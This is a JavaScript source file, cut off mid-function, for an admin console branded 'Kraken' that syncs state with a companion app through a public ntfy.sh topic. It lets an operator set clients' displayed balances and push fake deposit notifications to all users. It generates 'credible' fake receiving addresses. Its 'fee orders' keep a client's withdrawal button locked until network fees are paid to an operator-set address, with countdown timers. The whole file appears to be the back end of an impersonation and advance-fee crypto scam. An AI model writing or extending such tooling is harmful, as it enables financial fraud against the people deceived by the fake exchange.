/* Kraken — console d'administration. État partagé avec l'app via ntfy.sh. */
(() => {
  "use strict";

  const TOPIC = "kraken-partage-4b8d1c6f";
  const AKEY = "kraken_admin_v1";
  const JKEY = "kraken_admin_journal_v1";
  const $ = s => document.querySelector(s);
  const $$ = s => Array.from(document.querySelectorAll(s));

  const COINS = [
    { sym: "BTC", name: "Bitcoin", icon: "assets/img/coins/btc.svg" },
    { sym: "ETH", name: "Ethereum", icon: "assets/img/coins/eth.svg" },
    { sym: "USDC", name: "USDC", icon: "assets/img/coins/usdc.svg" },
    { sym: "SOL", name: "Solana", icon: "assets/img/coins/sol.svg" },
    { sym: "XRP", name: "XRP", icon: "assets/img/coins/xrp.svg" },
    { sym: "ADA", name: "Cardano", icon: "assets/img/coins/ada.svg" },
    { sym: "DOGE", name: "Dogecoin", icon: "assets/img/coins/doge.svg" },
    { sym: "SUI", name: "Sui", icon: "assets/img/coins/sui.svg" },
    { sym: "LINK", name: "Chainlink", icon: "assets/img/coins/link.svg" },
    { sym: "AVAX", name: "Avalanche", icon: "assets/img/coins/avax.svg" },
    { sym: "DOT", name: "Polkadot", icon: "assets/img/coins/dot.svg" },
    { sym: "HYPE", name: "Hyperliquid", icon: "assets/img/coins/hyperliquid.png" }
  ];
  const EUR = { sym: "EUR", name: "Euro", icon: "assets/img/flag_eu.webp" };
  const coin = s => s === "EUR" ? EUR : COINS.find(c => c.sym === s);

  const DEFAULTS = {
    first: "bernard", last: "", email: "bernard@exemple.com",
    username: "bernard", phone: "", dob: "", country: "France", postal: "",
    cash: 0, gas: 2.40, balances: {}, fees: {}, addresses: {}, feeAddresses: {},
    feeOrders: {}, rev: 0
  };

  const esc = v => String(v == null ? "" : v).replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
  const FEE_TTL = 2 * 60 * 60 * 1000;

  const load = () => {
    try {
      const p = JSON.parse(localStorage.getItem(AKEY) || "{}");
      return {
        ...structuredClone(DEFAULTS), ...p,
        balances: { ...(p.balances || {}) },
        fees: { ...(p.fees || {}) },
        addresses: { ...(p.addresses || {}) },
        feeAddresses: { ...(p.feeAddresses || {}) },
        feeOrders: { ...(p.feeOrders || {}) }
      };
    } catch { return structuredClone(DEFAULTS); }
  };
  let ST = load();
  let DSYM = "BTC";
  let busy = false;
  let lastSync = 0;

  const save = () => localStorage.setItem(AKEY, JSON.stringify(ST));
  const nf = (n, d = 2) => Number(n).toLocaleString("fr-FR", { minimumFractionDigits: d, maximumFractionDigits: d });
  const eur = n => nf(n, 2) + " €";
  const parseAmt = v => {
    if (typeof v !== "string") v = String(v ?? "");
    const n = parseFloat(v.replace(/\s/g, "").replace(",", "."));
    return Number.isFinite(n) ? n : 0;
  };
  const fmtWhen = ts => {
    const d = new Date(ts);
    return d.toLocaleDateString("fr-FR", { day: "2-digit", month: "short" }) + " · " +
      d.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" });
  };
  const qtyTxt = (n, s) => nf(n, 8).replace(/0+$/, "").replace(/,$/, "") + " " + s;

  // ── adresses de réception crédibles, fixes par actif ─────────────────
  const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  const BECH = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
  const HEX = "0123456789abcdef";
  const rnd = (set, n) => {
    const b = new Uint8Array(n); crypto.getRandomValues(b);
    let s = ""; for (const x of b) s += set[x % set.length];
    return s;
  };
  const GEN = {
    BTC: () => "bc1q" + rnd(BECH, 38),
    ETH: () => "0x" + rnd(HEX, 40),
    USDC: () => "0x" + rnd(HEX, 40),
    LINK: () => "0x" + rnd(HEX, 40),
    AVAX: () => "0x" + rnd(HEX, 40),
    HYPE: () => "0x" + rnd(HEX, 40),
    SOL: () => rnd(B58, 44),
    XRP: () => "r" + rnd(B58, 33),
    ADA: () => "addr1q" + rnd(BECH, 56),
    DOGE: () => "D" + rnd(B58, 33),
    SUI: () => "0x" + rnd(HEX, 64),
    DOT: () => "1" + rnd(B58, 47),
    EUR: () => "FR76 3000 4006 9700 0123 4567 890"
  };
  const genAddr = sym => (GEN[sym] ? GEN[sym]() : "0x" + rnd(HEX, 40));

  // Adresses actives par defaut : ce sont exactement celles que l'app
  // affiche tant qu'aucune adresse personnalisee n'a ete publiee.
  const APP_ADDR = {
    EUR: "FR76 3000 4000 0300 0000 4821 264",
    BTC: "bc1qh4kra3n8x7f3a2c58be41d6f8a0m2j9",
    ETH: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    SOL: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU",
    USDC: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    XRP: "rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",
    ADA: "addr1qx2kra3n8x7f3a2c58be41d6f8a0m2j9v4p6",
    DOGE: "DMu3Xkra3n8x7f3a2c58be41d6f8a0m2j9",
    SUI: "0x7f3a2c58be41d6f8a0c4e19bb7d5a12f9c8d3e61",
    LINK: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    AVAX: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
    DOT: "1kra3n8x7f3a2c58be41d6f8a0M2j9v4P6",
    HYPE: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61"
  };

  function ensureAddresses() {
    let changed = false;
    for (const c of [...COINS, EUR]) {
      if (!ST.addresses[c.sym] || ST.addresses[c.sym].length < 10) {
        ST.addresses[c.sym] = APP_ADDR[c.sym] || genAddr(c.sym);
        changed = true;
      }
    }
    if (changed) save();
  }

  // ── transport ────────────────────────────────────────────────────────
  // Le profil est un bloc a part. Il part dans l'etat complet et aussi sous
  // son propre type de message : l'app l'applique sur l'horodatage serveur,
  // sans test de revision, donc il arrive meme si l'app a publie un rev
  // plus grand depuis (soldes, ordres de frais).
  const PROFILE_KEYS = ["first", "last", "email", "username", "phone", "dob", "country", "postal"];
  const profileOf = () => {
    const o = {};
    for (const k of PROFILE_KEYS) o[k] = String(ST[k] ?? "");
    return o;
  };
  const profileFrom = src => {
    if (!src || typeof src !== "object") return null;
    const o = {};
    let any = false;
    for (const k of PROFILE_KEYS) {
      if (typeof src[k] === "string") { o[k] = src[k]; any = true; }
    }
    return any ? o : null;
  };

  const snapshot = () => ({
    ...profileOf(),
    cash: Number(ST.cash) || 0, gas: Number(ST.gas) || 0,
    balances: { ...ST.balances }, fees: { ...ST.fees },
    usdcFee: { ...(ST.usdcFee || {}) },
    addresses: { ...ST.addresses },
    feeAddresses: { ...(ST.feeAddresses || {}) },
    feeOrders: Object.fromEntries(Object.entries(ST.feeOrders || {}).map(([k, v]) => [k, { ...v }])),
    rev: Number(ST.rev) || 0
  });

  // réseaux USDC (mêmes identifiants que l'app)
  const USDC_NETS = [
    { id: "erc20", label: "Ethereum (ERC20)" },
    { id: "polygon", label: "Polygon" },
    { id: "arbitrum", label: "Arbitrum One" },
    { id: "optimism", label: "Optimism" },
    { id: "base", label: "Base" },
    { id: "solana", label: "Solana" }
  ];

  async function publish(msg) {
    const ctrl = new AbortController();
    const cut = setTimeout(() => ctrl.abort(), 8000);
    try {
      const r = await fetch("https://ntfy.sh/" + TOPIC, {
        method: "POST", body: JSON.stringify({ app: "kraken", ...msg }),
        headers: { "Content-Type": "text/plain" }, signal: ctrl.signal
      });
      // Un 429 (limite ntfy) n'est pas une reussite : sans ce test la
      // console annoncait "synchronise" alors que rien n'etait publie.
      if (!r.ok) throw new Error("HTTP " + r.status);
      setLive(true);
      return true;
    } catch { setLive(false); return false; }
    finally { clearTimeout(cut); }
  }

  // Publication en attente : garde l'etat sous le coude et reessaie tant
  // que ntfy refuse, pour qu'un frais enregistre finisse toujours par partir.
  const PKEY = "kraken_admin_pending_v1";
  let pendingPub = false;
  let addrDirty = false;  // saisie d'adresse en cours, non publiee
  const setPending = v => {
    pendingPub = !!v;
    try { if (v) localStorage.setItem(PKEY, "1"); else localStorage.removeItem(PKEY); } catch { }
  };
  try { pendingPub = localStorage.getItem(PKEY) === "1"; } catch { }

  async function publishState() {
    ST.rev = Math.max(Date.now(), (Number(ST.rev) || 0) + 1);
    save();
    const ok = await publish({ type: "state", state: snapshot() });
    if (!ok) setPending(true);
    renderSync();
    return ok;
  }

  function applyState(s) {
    if (!s || !(Number(s.rev) > (Number(ST.rev) || 0))) return false;
    const pf = profileFrom(s);
    if (pf) Object.assign(ST, pf);
    ST.cash = Math.max(0, Number(s.cash) || 0);
    ST.gas = Math.max(0, Number(s.gas) || 0);
    ST.balances = { ...(s.balances || {}) };
    ST.fees = { ...(s.fees || {}) };
    ST.usdcFee = { ...(s.usdcFee || {}) };
    ST.addresses = { ...(s.addresses || {}) };
    ST.feeAddresses = { ...(s.feeAddresses || {}) };
    if (s.feeOrders && typeof s.feeOrders === "object") {
      for (const r of Object.values(s.feeOrders)) mergeFeeOrder(r);
    }
    ST.rev = Number(s.rev);
    save();
    return true;
  }

  function setLive(on) {
    const l = $("#live");
    if (!l) return;
    l.classList.toggle("on", on);
    $("#liveTxt").textContent = on ? "En ligne" : "Hors ligne";
  }

  async function poll() {
    if (busy || document.hidden) return;
    busy = true;
    const ctrl = new AbortController();
    const cut = setTimeout(() => ctrl.abort(), 8000);
    // since=all ne sert qu'au premier passage : ensuite on ne demande que
    // les messages posterieurs, ce qui allege fortement la limite ntfy.
    const since = Number(ST.msgTime) || 0;
    const url = "https://ntfy.sh/" + TOPIC + "/json?poll=1&since=" + (since || "all");
    try {
      const r = await fetch(url, { cache: "no-store", signal: ctrl.signal });
      const txt = await r.text();
      let best = null, bestT = 0;
      const freshOrders = [];
      for (const line of txt.split("\n")) {
        if (!line.trim()) continue;
        let m; try { m = JSON.parse(line); } catch { continue; }
        if (m.event !== "message" || !m.message) continue;
        lastSync = Math.max(lastSync, (Number(m.time) || 0) * 1000);
        let p; try { p = JSON.parse(m.message); } catch { continue; }
        if (p.app !== "kraken") continue;
        if (p.type === "feeOrder" && p.order) { freshOrders.push(p.order); continue; }
        if (p.type !== "state" || !p.state) continue;
        const t = Number(m.time) || 0;
        if (!best || t >= bestT) { bestT = t; best = p.state; }
      }
      let ordersTouched = false;
      freshOrders.forEach(o => { if (mergeFeeOrder(o)) ordersTouched = true; });
      if (ordersTouched) { save(); if (ST && $("#feeOrderList")) renderFeeOrders(); }
      const seen = Number(ST.msgTime) || 0;
      if (best && bestT > seen) {
        ST.msgTime = bestT;
        if (applyState(best)) {
          ensureAddresses();
          // Ne pas re-rendre pendant une saisie d'adresse : sinon la synchro
          // efface la valeur en cours de frappe sous les doigts.
          const a = document.activeElement;
          const typing = addrDirty || !!(a && (a.matches("[data-addr],[data-feeaddr]") || a.id === "dEdit"));
          if (typing) renderSync(); else renderAll();
        }
        save();
      }
      setLive(true);
    } catch { setLive(false); }
    clearTimeout(cut);
    busy = false;
    renderSync();
  }

  // ── rendu ────────────────────────────────────────────────────────────
  function renderAccount() {
    $("#aFirst").value = ST.first || "";
    $("#aLast").value = ST.last || "";
    $("#aUser").value = ST.username || "";
    $("#aMail").value = ST.email || "";
    $("#aPhone").value = ST.phone || "";
    $("#aDob").value = ST.dob || "";
    $("#aCountry").value = ST.country || "";
    $("#aAddr").value = ST.postal || "";
    $("#aCash").value = nf(ST.cash || 0, 2);
    $("#aGas").value = nf(ST.gas || 0, 2);
  }

  function renderWallet() {
    $("#walletRows").innerHTML = COINS.map(c => {
      const b = ST.balances[c.sym];
      return `<div class="coinrow">
        <img class="coin" src="${c.icon}" alt="">
        <span class="sym">${c.sym}</span>
        <input data-bal="${c.sym}" inputmode="decimal" placeholder="0" value="${b ? String(b).replace(".", ",") : ""}">
      </div>`;
    }).join("");
    $("#walletGrid").innerHTML = COINS.map(c =>
      `<button class="pick" data-add="${c.sym}"><img class="coin" src="${c.icon}" alt=""><b>${c.sym}</b></button>`
    ).join("");
    renderFees();
    renderFeeAssets();
    renderFeeAddresses();
  }

  // Frais reseau par actif (hors USDC, qui a son propre bloc par reseau).
  function renderFeeAssets() {
    const box = $("#feeAssetRows");
    if (!box) return;
    box.innerHTML = COINS.filter(c => c.sym !== "USDC").map(c => {
      const f = ST.fees[c.sym];
      return `<div class="coinrow">
        <img class="coin coin-sm" src="${c.icon}" alt="">
        <span class="sym">${c.sym}</span>
        <span class="fee"><input data-fee="${c.sym}" inputmode="decimal" placeholder="${nf(ST.gas || 0, 2)}" value="${f ? String(f).replace(".", ",") : ""}"></span>
        <em class="unit">EUR</em>
      </div>`;
    }).join("");
  }

  // frais réseau : USDC uniquement, par réseau
  function renderFees() {
    const box = $("#feeRows");
    if (!box) return;
    const cur = ST.usdcFee || {};
    const uvals = USDC_NETS.map(n => Number(cur[n.id]) || 0).filter(v => v > 0);
    const uAll = uvals.length === USDC_NETS.length && uvals.every(v => v === uvals[0]) ? uvals[0] : 0;
    box.innerHTML = `<div class="coinrow">
        <span class="sym" style="width:auto;flex:1"><b>Tous les réseaux</b></span>
        <span class="fee"><input data-usdcall inputmode="decimal" placeholder="${nf(ST.gas || 0, 2)}" value="${uAll ? String(uAll).replace(".", ",") : ""}" title="S'applique à tous les réseaux USDC"></span>
        <em class="unit">EUR</em>
      </div>` + USDC_NETS.map(n => `
      <div class="coinrow">
        <span class="sym" style="width:auto;flex:1">${n.label}</span>
        <span class="fee"><input data-unet="${n.id}" inputmode="decimal" placeholder="${nf(ST.gas || 0, 2)}" value="${cur[n.id] ? String(cur[n.id]).replace(".", ",") : ""}"></span>
        <em class="unit">EUR</em>
      </div>`).join("");
  }

  // Toutes les adresses de réception, une par actif, plus l'adresse de
  // perception des frais qui peut être distincte pour chaque actif.
  function renderAddresses() {
    const box = $("#addrRows");
    if (!box) return;
    box.innerHTML = [...COINS, EUR].map(c =>
      `<div class="addrrow">
        <span class="sym">${c.sym}</span>
        <span class="addrfields">
          <span class="addrline">
            <input data-addr="${c.sym}" spellcheck="false" autocomplete="off"
                   value="${ST.addresses[c.sym] || ""}" placeholder="Réception — ${genAddr(c.sym)}">
            <button type="button" class="regen-mini" data-copy="${c.sym}" title="Copier l'adresse ${c.sym}">Copier</button>
            <button type="button" class="regen-mini" data-regen="${c.sym}" title="Générer une adresse ${c.sym} — tu pourras la modifier">Régénérer</button>
          </span>
        </span>
      </div>`).join("");
  }

  async function saveAllAddresses() {
    const recv = {}, fee = {}, cleared = [];
    $$("[data-addr]").forEach(inp => {
      const v = inp.value.trim();
      if (v.length >= 10) recv[inp.dataset.addr] = v;
    });
    $$("[data-feeaddr]").forEach(inp => {
      const v = inp.value.trim();
      const sym = inp.dataset.feeaddr;
      if (v.length >= 10) fee[sym] = v;
      else cleared.push(sym);
    });
    if (!Object.keys(recv).length && !Object.keys(fee).length && !cleared.length) {
      return toast("Aucune adresse valide");
    }
    ST.addresses = { ...ST.addresses, ...recv };
    // Un champ vidé remet l'adresse de frais sur celle de réception.
    const next = { ...(ST.feeAddresses || {}), ...fee };
    cleared.forEach(sym => { delete next[sym]; });
    ST.feeAddresses = next;
    addrDirty = false;
    const ok = await publishState();
    renderAll();
    toast(ok
      ? "Adresses publiées sur tous les appareils"
      : "Adresses enregistrées localement");
  }

  // Genere des adresses dans les champs, sans rien publier : l'utilisateur
  // peut les remplacer par sa propre adresse avant d'enregistrer.
  function regenAllAddresses() {
    $$("[data-addr]").forEach(inp => { inp.value = genAddr(inp.dataset.addr); });
    const first = $("[data-addr]");
    if (first) { first.focus(); try { first.select(); } catch { } }
    toast("Adresses générées - modifie-les puis Publier les adresses");
  }

  function renderDeposit() {
    $("#depGrid").innerHTML = [...COINS, EUR].map(c =>
      `<button class="pick ${c.sym === DSYM ? "on" : ""}" data-dep="${c.sym}"><img class="coin" src="${c.icon}" alt=""><b>${c.sym}</b></button>`
    ).join("");
    const c = coin(DSYM);
    $("#dAmount").placeholder = DSYM === "EUR" ? "50,00" : "0,0154";
    $("#dAddr").value = ST.addresses[DSYM] || "";
    $("#dAddr").placeholder = DSYM === "EUR" ? "FR76 …" : "Adresse d'envoi";
    $("#dText").placeholder = "Dépôt de " + (DSYM === "EUR" ? "50,00 €" : "0,0154 " + DSYM) + " reçu sur votre compte";
    $("#dOwn").textContent = ST.addresses[DSYM] || "—";
    if ($("#dEdit")) $("#dEdit").value = ST.addresses[DSYM] || "";
    $("#dSend").textContent = DSYM === "EUR"
      ? "Envoyer le dépôt à tous les utilisateurs"
      : "Envoyer le dépôt à tous les utilisateurs";
  }

  function journal() {
    try { const a = JSON.parse(localStorage.getItem(JKEY) || "[]"); return Array.isArray(a) ? a : []; }
    catch { return []; }
  }

  function renderLog() {
    const list = journal();
    $("#logCard").innerHTML = list.length ? list.map(j => `
      <div class="jrow">
        <span class="jico"><svg viewBox="0 0 24 24"><path d="M12 19V5"/><path d="M6 11l6-6 6 6"/></svg></span>
        <div class="jmain">
          <div class="jtitle">${j.kind === "deposit" ? "Dépôt envoyé" : "Notification envoyée"}</div>
          <div class="jtext">${j.text || ""}</div>
          ${j.amount ? `<div class="jamt">+${j.asset === "EUR" ? eur(j.amount) : qtyTxt(j.amount, j.asset)}</div>` : ""}
          ${j.addr ? `<div class="jaddr">${j.addr}</div>` : ""}
          <div class="jwhen">${fmtWhen(j.at)}</div>
        </div>
      </div>`).join("") : `<div class="empty">Aucune notification envoyée pour le moment.</div>`;
  }

  function renderSync() {
    const r = ST.rev ? fmtWhen(ST.rev) : "—";
    const a = lastSync ? fmtWhen(lastSync) : "—";
    if ($("#syncRev")) $("#syncRev").textContent = r;
    if ($("#syncAt")) $("#syncAt").textContent = a;
  }

  function renderAll() {
    renderAccount(); renderWallet(); renderAddresses(); renderDeposit(); renderLog(); renderSync(); renderFeeOrders();
  }

  // ── ordres de frais : édition en direct, reçu partiel ────────────────
  // L'app publie un ordre dès qu'un envoi ne couvre pas les frais réseau.
  // On le reprend ici, on enregistre le montant reçu (partiel ou total) et
  // on republie : la fiche client, la notification et le bouton de
  // validation suivent sans recharger.
  let FEE_EDIT = null; // null = liste, "new" = création, sinon id de l'ordre

  function aFeeRemaining(o) {
    const amount = Number(o && o.amount) || 0;
    const paid = Math.max(0, Number(o && o.paid) || 0);
    return { amount, paid, remaining: Math.max(0, amount - paid) };
  }

  function mergeFeeOrder(r) {
    if (!r || typeof r !== "object" || !r.id) return false;
    ST.feeOrders = ST.feeOrders || {};
    const cur = ST.feeOrders[r.id];
    if (!cur) { ST.feeOrders[r.id] = { ...r }; return true; }
    let changed = false;
    const paid = Math.max(Number(cur.paid) || 0, Number(r.paid) || 0);
    if (paid !== (Number(cur.paid) || 0)) { cur.paid = paid; changed = true; }
    if (r.ok && !cur.ok) { cur.ok = true; changed = true; }
    if (r.done && !cur.done) { cur.done = true; changed = true; }
    if (r.cancelled && !cur.cancelled) { cur.cancelled = true; changed = true; }
    if (r.via && !cur.via) { cur.via = String(r.via); changed = true; }
    if (!cur.src && r.src) { cur.src = String(r.src); changed = true; }
    if (!cur.kind && r.kind) { cur.kind = String(r.kind); changed = true; }
    if (Number(r.rev) > Number(cur.rev)) {
      cur.rev = Number(r.rev);
      cur.amount = Number(r.amount) || cur.amount;
      cur.amt = Number(r.amt) || cur.amt;
      cur.sym = r.sym || cur.sym;
      cur.pick = r.pick || cur.pick;
      cur.addr = r.addr != null ? String(r.addr) : cur.addr;
      cur.feeAddr = r.feeAddr != null ? String(r.feeAddr) : cur.feeAddr;
      cur.ref = r.ref != null ? String(r.ref) : cur.ref;
      cur.via = r.via != null ? String(r.via) : cur.via;
      cur.statusTxt = r.statusTxt != null ? String(r.statusTxt) : cur.statusTxt;
      cur.lock = !!r.lock;
      changed = true;
    }
    if (Number(r.amount) > 0) cur.amount = Number(r.amount);
    if (Number(r.exp) > 0) cur.exp = Number(r.exp);
    return changed;
  }

  async function publishOrder(o) { return publish({ type: "feeOrder", order: { ...o } }); }

  function feeRowHTML(o) {
    const rem = aFeeRemaining(o);
    const state = o.cancelled ? "annulé" : o.done ? "réglé" : o.ok ? "validé"
      : (Number(o.exp) && Number(o.exp) < Date.now() ? "délai dépassé" : "en attente");
    const cls = o.ok || o.done ? "ok" : "wait";
    const amtSent = Number(o.amt) > 0
      ? (o.pick === "EUR" ? eur(Number(o.amt), 2) : qtyTxt(Number(o.amt), o.pick || "USDC"))
      : "";
    return `<div class="feerow">
      <div class="feemain">
        <div class="feeline"><b>${eur(rem.amount, 2)}</b> <span class="feesym">${esc(o.sym || "")}</span> · <em class="feestate ${cls}">${state}</em></div>
        ${amtSent ? `<div class="feesub">envoi ${esc(amtSent)} · ${esc(o.kind === "send" ? "transaction" : "frais")}</div>` : ""}
        <div class="feesub">payé ${eur(rem.paid, 2)} · reste ${eur(rem.remaining, 2)}${o.pick ? " · " + esc(o.pick) : ""}</div>
        ${o.feeAddr ? `<div class="feesub mono">frais → ${esc(o.feeAddr)}</div>` : ""}
        ${o.addr ? `<div class="feesub mono">dest → ${esc(o.addr)}</div>` : ""}
        ${o.ref ? `<div class="feesub mono">réf ${esc(o.ref)}</div>` : ""}
        ${o.src === "app" ? `<div class="feesub">depuis l'app</div>` : `<div class="feesub">créé ici</div>`}
      </div>
      <div class="feectl">
        <input data-paid="${esc(o.id)}" inputmode="decimal" autocomplete="off" placeholder="Reçu €">
        <button type="button" data-fee="partial" data-id="${esc(o.id)}">Ajouter</button>
        <button type="button" data-fee="ok" data-id="${esc(o.id)}">C'est bon</button>
        <button type="button" class="ghost" data-fee="del" data-id="${esc(o.id)}">Retirer</button>
      </div>
    </div>`;
  }

  function feeEditorHTML(id) {
    const o = id && id !== "new" ? (ST.feeOrders || {})[id] : null;
    const isNew = !o;
    const val = n => (Number.isFinite(+n) && +n !== 0 ? String(n).replace(".", ",") : "");
    const amount = o ? Number(o.amount) || 0 : 0;
    const paid = o ? Number(o.paid) || 0 : 0;
    const rem = Math.max(0, amount - paid);
    const expH = o && o.exp ? Math.max(0, (Number(o.exp) - Date.now()) / 3600000).toFixed(1) : "2";
    const status = o ? (o.cancelled ? "annule" : o.done ? "regle" : o.ok ? "valide" : "attente") : "attente";
    const opt = (v, t) => `<option value="${v}"${status === v ? " selected" : ""}>${t}</option>`;
    const symOpt = ["ETH", "USDC", "BTC", "SOL", "EUR"].map(s => `<option value="${s}"${o && o.sym === s ? " selected" : ""}>${s}</option>`).join("");
    const pickOpt = ["USDC", "BTC", "ETH", "SOL", "EUR"].map(s => `<option value="${s}"${o && o.pick === s ? " selected" : ""}>${s}</option>`).join("");
    return `<h3>${isNew ? "Ajouter un ordre de frais" : "Modifier l'ordre de frais"}</h3>
      <p class="sub" style="margin:-6px 0 12px">Mêmes valeurs que la fiche client. Chaque champ se répercute en direct dans l'app après « Appliquer ».</p>
      <label class="field"><span>Montant envoyé (actif)</span><input data-fe="amt" inputmode="decimal" autocomplete="off" value="${val(o && o.amt)}" placeholder="0"></label>
      <label class="field"><span>Frais réseau (€)</span><input data-fe="amount" inputmode="decimal" autocomplete="off" value="${val(amount)}" placeholder="0"></label>
      <label class="field"><span>Déjà reçu (€)</span><input data-fe="paid" inputmode="decimal" autocomplete="off" value="${val(paid)}" placeholder="0"></label>
      <label class="field"><span>Frais crédités à (adresse de perception)</span><input data-fe="feeAddr" spellcheck="false" autocomplete="off" value="${esc(o && o.feeAddr)}" placeholder="0x… adresse des frais"></label>
      <label class="field"><span>Destinataire de l'envoi</span><input data-fe="recipient" spellcheck="false" autocomplete="off" value="${esc(o && o.addr)}" placeholder="adresse qui reçoit l'envoi"></label>
      <label class="field"><span>Référence</span><input data-fe="ref" spellcheck="false" autocomplete="off" value="${esc(o && o.ref)}" placeholder="0x… référence de transaction"></label>
      <label class="field"><span>Statut</span><select data-fe="status">
        ${opt("attente", "En attente des frais réseau")}
        ${opt("valide", "Validé — bouton débloqué")}
        ${opt("regle", "Réglé — terminé")}
        ${opt("annule", "Annulé")}
      </select></label>
      <label class="field"><span>Devise des frais</span><select data-fe="sym">${symOpt}</select></label>
      <label class="field"><span>Actif envoyé</span><select data-fe="pick">${pickOpt}</select></label>
      <label class="field"><span>Temps restant (heures)</span><input data-fe="expH" inputmode="decimal" autocomplete="off" value="${esc(expH)}" placeholder="2"></label>
      <p class="sub">Reste à régler : <b data-feout="remain">${eur(rem, 2)}</b></p>
      <button class="btn" data-feeed="apply">${isNew ? "Ajouter l'ordre" : "Appliquer"}</button>
      <button class="btn ghost" data-feeed="valid">Valider (débloque le bouton client)</button>
      <button class="btn ghost" data-feeed="back">Retour à la liste</button>
      ${isNew ? "" : `<button class="btn ghost" data-feeed="del">Supprimer l'ordre</button>`}`;
  }

  function renderFeeOrders() {
    const list = $("#feeOrderList");
    const editor = $("#feeEditor");
    if (!list || !editor) return;
    const ae = document.activeElement;
    // Ne pas écraser une saisie en cours (reçu partiel ou fiche).
    if (FEE_EDIT && editor.contains(ae)) return;
    if (!FEE_EDIT && ae && ae.matches && ae.matches("[data-paid]")) return;
    if (FEE_EDIT) {
      editor.hidden = false;
      $("#feeOrderCard").hidden = true;
      editor.innerHTML = feeEditorHTML(FEE_EDIT);
      return;
    }
    editor.hidden = true;
    $("#feeOrderCard").hidden = false;
    const orders = Object.values(ST.feeOrders || {})
      .filter(o => o && typeof o === "object")
      .sort((a, b) => (Number(b.at) || 0) - (Number(a.at) || 0));
    list.innerHTML = orders.length
      ? orders.map(feeRowHTML).join("")
      : `<div class="empty">Aucun ordre de frais pour le moment. Ils apparaissent ici dès qu'un envoi laisse des frais à régler.</div>`;
  }

  async function feeApply(forceStatus) {
    const g = n => { const x = document.querySelector('#feeEditor [data-fe="' + n + '"]'); return x ? x.value : ""; };
    const now = Date.now();
    const amount = parseAmt(g("amount"));
    const paid = parseAmt(g("paid"));
    let status = String(forceStatus || g("status") || "attente");
    if (status === "attente" && amount > 0 && paid >= amount) status = "valide";
    const expH = parseAmt(g("expH"));
    let o = (FEE_EDIT && FEE_EDIT !== "new") ? (ST.feeOrders[FEE_EDIT]) : null;
    if (!o) {
      const id = "fo" + now.toString(36) + Math.floor(Math.random() * 1e4).toString(36);
      o = { id, at: now, exp: now + FEE_TTL, paid: 0, ok: false, done: false };
      ST.feeOrders[id] = o; FEE_EDIT = id;
    }
    o.amount = amount; o.lock = amount > 0; o.rev = now;
    o.amt = parseAmt(g("amt"));
    o.sym = String(g("sym") || "ETH").toUpperCase() || "ETH";
    o.pick = String(g("pick") || "USDC").toUpperCase() || "USDC";
    o.addr = String(g("recipient") || "").trim();
    o.feeAddr = String(g("feeAddr") || "").trim();
    o.ref = String(g("ref") || "").trim();
    o.via = String(g("via") || "").trim();
    o.paid = status === "annule" ? 0 : paid;
    if (expH > 0) o.exp = now + Math.round(expH * 3600000);
    o.cancelled = status === "annule";
    o.done = status === "regle" || status === "annule";
    o.ok = status === "valide" || status === "regle" || (amount > 0 && paid >= amount);
    o.statusTxt = status === "valide" ? "Frais validés — en attente de confirmation"
      : status === "regle" ? "Réglé — transaction confirmée"
        : status === "annule" ? "Annulée"
          : "En attente des frais réseau";
    save();
    await publishOrder(o);
    await publishState();
    return o;
  }

  async function feeListClick(e) {
    const b = e.target.closest("[data-fee]");
    if (!b) return;
    const id = b.dataset.id;
    const o = (ST.feeOrders || {})[id];
    const act = b.dataset.fee;
    if (act === "edit") { FEE_EDIT = id; return renderFeeOrders(); }
    if (act === "del") {
      if (o) { o.cancelled = true; o.done = true; o.ok = false; o.rev = Date.now(); save(); await publishOrder(o); await publishState(); }
      toast("Ordre annulé"); renderAll(); return;
    }
    if (!o) return toast("Ordre introuvable");
    if (act === "partial") {
      const inp = document.querySelector('[data-paid="' + id + '"]');
      const v = parseAmt(inp ? inp.value : "");
      if (!(v > 0)) return toast("Saisis le montant reçu");
      const rem = aFeeRemaining(o);
      o.paid = Math.min(rem.amount, (Number(o.paid) || 0) + v);
      o.rev = Date.now();
      if (o.paid >= rem.amount) o.ok = true;
      save();
      await publishOrder(o); await publishState();
      renderAll();
      toast("Reçu de " + eur(v, 2) + " — reste " + eur(Math.max(0, rem.amount - o.paid), 2));
      return;
    }
    if (act === "ok") {
      o.ok = true; o.rev = Date.now();
      save(); await publishOrder(o); await publishState();
      renderAll();
      toast("Frais validés — bouton client débloqué");
    }
  }

  async function feeEditorClick(e) {
    const b = e.target.closest("[data-feeed]");
    if (!b) return;
    const act = b.dataset.feeed;
    if (act === "back") { FEE_EDIT = null; return renderFeeOrders(); }
    if (act === "del") {
      if (FEE_EDIT && FEE_EDIT !== "new") {
        const o = ST.feeOrders[FEE_EDIT];
        if (o) { o.cancelled = true; o.done = true; o.ok = false; o.rev = Date.now(); save(); await publishOrder(o); await publishState(); }
      }
      FEE_EDIT = null; renderAll(); return toast("Ordre supprimé");
    }
    const o = await feeApply(act === "valid" ? "valide" : null);
    toast(o.cancelled ? "Ordre annulé" : o.ok ? "Ordre validé — bouton client débloqué" : "Ordre appliqué en direct");
    renderAll();
  }

  function feeEditorInput(e) {
    const el = e.target;
    if (!el || !el.matches || !el.matches("[data-fe]")) return;
    const g = n => { const x = document.querySelector('#feeEditor [data-fe="' + n + '"]'); return x ? x.value : ""; };
    const amount = parseAmt(g("amount"));
    const paid = parseAmt(g("paid"));
    const rem = Math.max(0, amount - paid);
    document.querySelectorAll('#feeEditor [data-feout="remain"]').forEach(x => { x.textContent = eur(rem, 2); });
    const sel = document.querySelector('#feeEditor [data-fe="status"]');
    if (sel && sel.value === "attente" && amount > 0 && paid >= amount) sel.value = "valide";
  }

  // ── flux temps réel (SSE) : état, frais et notifs sans rafraîchir ────
  function ingestLive(m) {
    if (!m || m.event !== "message" || !m.message) return;
    let p; try { p = JSON.parse(m.message); } catch { return; }
